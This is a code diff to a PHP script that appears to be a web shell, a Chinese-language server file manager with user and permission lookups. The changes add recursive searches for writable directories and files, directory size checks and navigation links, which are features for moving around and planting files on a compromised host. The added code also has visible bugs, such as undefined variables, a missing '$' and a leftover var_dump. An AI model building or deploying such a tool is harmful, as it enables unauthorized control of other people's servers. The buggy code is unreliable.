@@ -84,6 +84,7 @@ if ($op == 'logout'){
 formhead(array('name'=>'opform'));
 makehide('path',$nowpath);
 makehide('op',($op ? $op : 'file'));
+makehide('dir_file');
 formfoot();
 if (!function_exists('posix_getegid')) {
     $user = @get_current_user();
@@ -124,6 +125,7 @@ if (!function_exists('posix_getegid')) {
 if ($op == 'file') {
     $err && m($err);
     $nowpath = @$path ? $path : wwwroot;
+    var_dump($nowpath);
     if (!file_exists($nowpath)) {
        header('location: '.$self.'?op=file&err='.$nowpath.'不存在');
     }
@@ -202,10 +204,16 @@ if ($op == 'file') {
             $('creatfile').submit()
         }
 
-        function godir(nopath){
+        function godir(nopath,dir){
             if(!nopath) return ;
+            if(dir) $('opform').dir.value = dir;
             $('opform').path.value = nopath;
             $('opform').submit();
+        }
+        function getsize(getdir){
+            if(!getdir) return ;
+            $('getsize').getdir.value = getdir;
+            $('getsize').submit();
         }
     </script>
     <table style="display:none" width="100%" border="0" cellpadding="5" cellspacing="0">
@@ -221,6 +229,11 @@ if ($op == 'file') {
                 makehide('filename');
                 makehide('path',$nowpath);
                 makehide('op', 'file');
+                formfoot();
+                formhead(array('name' => 'getsize'));
+                makehide('op','file');
+                makehide('getdir');
+                makehide('path',$nowpath);
                 formfoot();
                 ?>
             </td>
@@ -271,6 +284,63 @@ if ($op == 'file') {
             <td>--</td>
             <td><?php p('<a href="javascript:godir(\''.getupth($nowpath).'\')">父目录</a>');?></td>
         </tr>
+        <?php
+        $dirdata = array();
+        $filedata = array();
+        if($dir_file == 'dir'){
+            $dirdata = getdirlist($nowpath);
+        } elseif ($dir_file == 'file') {
+            $filedata = getfilelist($nowpath);
+        }else{
+            $dh = opendir($nowpath);
+            while (($file = readdir($dh)) !== false) {
+                $filepath = $nowpath.$file;
+                if (is_dir($filepath)) {
+                    $dirdb['filename']=$file;
+                    $dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
+                    $dirdb['dirchmod']=getchmod($filepath);
+                    $dirdb['dirperm']=getperms($filepath);
+                    $dirdb['fileowner']=get_user($filepath);
+                    $dirdb['dirlink']=$nowpath;
+                    $dirdb['server_link']=$filepath;
+                    $dirdata[]=$dirdb;
+                }else{
+                    $filedb['filename']=$file;
+                    $filedb['size'] = getsize(@filesize($file));
+                    $filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
+                    $filedb['dirchmod']=getchmod($filepath);
+                    $filedb['dirperm']=getperms($filepath);
+                    $filedb['fileowner']=get_user($filepath);
+                    $filedb['dirlink']=$nowpath;
+                    $filedb['server_link']=$filepath;
+                    $filedata[]=$filedb;
+                }
+            }
+            unset($dirdb);
+            unset($filedb);
+            closedir($dh);
+        }
+        @sort($dirdata);
+        @sort($filedata);
+        formhead(array('name'=>'filedlist'));
+        makehide('op','file');
+        makehide('path',$nowpath);
+        foreach ($dirdata as $key => $dirdb) {
+            if ($dirdb['filename'] != '.' && $dirdb['filename'] != '..') {
+                if ($getdir && $getdir == $dirdb['server_link']) {
+                    $dir_size = dirsize($dirdb['server_link']);
+                    $dir_size = is_numeric($dir_size) ? getsize($dir_size) : '未知';
+                }else {
+                    $dir_size = '<a href="javascript:getsize(\'' . $dirdb['server_link'] . '\')">查看</a>';
+                }
+                p('<tr>');
+                p('<td width="2%"><input name="cl" type="checkbox" value="' . $dirdb['server_link'].'"></td>');
+                p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'/\')">'.$dirdb['filename'].'</a></td>');
+                p('<td>'.$dirdb['mtime'].'</td>');
+                p('<td>'.$dir_size.'</td>');
+            }
+        }
+        ?>
     </table>
     </div>
     <?php } ?>
@@ -293,11 +363,117 @@ function getupth($path){
     return $path;
 }
 
+function getdirlist($dir){
+    global $nowpath,$j,$dirdata;
+    !j && $j =1;
+    if ($dh = opendir($dir)) {
+        while (($file = readdir($dh)) !== false) {
+            $f = str_replace('//', '/', $dir . '/' . $file);
+            if ($file != '.' && $file != '..' && is_dir($f)) {
+                if (@is_writable($f)) {
+                    $dirdata[$j]['filename'] = str_replace($nopath, '', $f);
+                    $dirdata[$j]['mtime'] = date('Y-m-d H:i:s', filemtime($f));
+                    $dirdata[$j]['dirchmod'] = getchmod($f);
+                    $dirdata[$j]['dirperms'] = getperms($f);
+                    $dirdata[$j]['dirlink'] = $dir;
+                    $dirdata[$j]['serverlink'] = $f;
+                    $j++;
+                }
+                getdirlist($f);
+            }
+        }
+        closedir($dh);
+        clearstatcache();
+        return $dirdata;
+        }else{
+        return array();
+    }
+}
+
+
+function getfilelist($dir){
+    global $nowath,$j,$filedata;
+    !$j && $j = 1;
+    if ($dh = opendir($dir)) {
+        while (($file = readdir($dh)) !== false) {
+            $f = str_replace('//', '/', $dir . '/' . $file);
+            if ($file != '.' && $file != '..' && is_dir($file)) {
+                getfilelist($f);
+            } elseif ($file != '.' && $file != '..' && is_file($file) ) {
+                if (is_writable($f)) {
+                    $filedata[$j]['filename'] = str_replace($nowath, '', $f);
+                    $filedata[$j]['size'] = getsize(@filesize($f));
+                    $filedata[$j]['filechmod']  =  getchmod($f);
+                    $filedata[$j]['fileperm']   =  getperms($f);
+                    $filedata[$j]['fileowner']  =  get_user($f);
+                    $filedata[$j]['dirlink'] = $dir;
+                    $filedata[$j]['server_link'] = $f;
+                    $j++;
+                }
+            }
+        }
+        closedir($dh);
+        clearstatcache();
+        return $filedata;
+    }else {
+    return array();
+    }
+}
+
+
+function dirsize($dir){
+    $dh = opendir($dir);
+    $size = 0;
+    while (($file = readdir($dh)) !== false) {
+        $f = $dir.'/'.$file;
+        if ($file != '.' && $file != '..') {
+            $size += @is_dir($f) ? dirsize($f) : @filesize($f);
+        }
+    }
+    @closedir($dh);
+    return $size;
+}
+function getsize($bytes){
+    $bytes = floatval($bytes);
+    $arbytes = array(
+            0 => array(
+                'unit' => 'TB',
+                'size' => pow(1024,4)
+            ),
+            1 => array(
+                'unit' => 'GB',
+                'size' => pow(1024,3)
+            ),
+            2 => array(
+                'unit' => 'MB',
+                'size' => pow(1024,2)
+            ),
+            3 => array(
+                'unit' => 'KB',
+                'size' => 1024
+            ),
+            4 => array(
+                'unit' => 'B',
+                'size' => 1
+            )
+    );
+    foreach ($arbytes as $aritem) {
+        if ($bytes >= $aritem['size']) {
+            $result = $bytes / $aritem['size'];
+            $result = str_replace('.', ',', strval(round($result, 2))) . ' ' . $aritem['unit'];
+            break;
+        }
+    }
+    return $result;
+}
+
 
 function get_dirs(){
     global $self,$self_path,$nowpath;
     p('<a href="'.$self.'?op=file">网站根目录</a>');
     p(' | <a href="javascript:godir(\''.$self_path.'\')">脚本目录</a>');
+    p(' |( <a href="javascript:godir(\''.$self_path.'\',\'dir\')">目录</a>');
+    p(' | <a href="javascript:godir(\''.$self_path.'\',\'file\')">文件</a> )');
     p(' | <a href="javascript:creatdir()">创建文件夹</a>');
     p(' | <a href="javascript:creatfile(\''.$nowpath.'\')">创建文件</a>');
 
@@ -478,4 +654,5 @@ function ip() {
 }
 
 ?>
+
 
